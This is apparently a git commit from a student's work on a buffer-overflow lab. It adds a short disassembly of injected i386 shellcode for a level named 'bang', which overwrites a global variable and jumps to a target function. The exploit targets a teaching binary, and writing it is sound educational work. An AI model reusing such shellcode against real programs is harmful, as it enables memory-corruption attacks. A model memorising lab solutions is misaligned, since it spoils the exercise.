7ec88fbbe26844e93213561a39dbb512377d71a6
youling chan <chenyoucyl@gmail.com>
2014-02-09 15:07:20 +0800

    level 2: bang

---
+++ buflab-handout/bang.d
@@ -0,0 +1,11 @@
+
+bang.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	a1 e4 c1 04 08       	mov    0x804c1e4,%eax
+   5:	a3 ec c1 04 08       	mov    %eax,0x804c1ec
+   a:	68 eb 8c 04 08       	push   $0x8048ceb
+   f:	c3                   	ret    
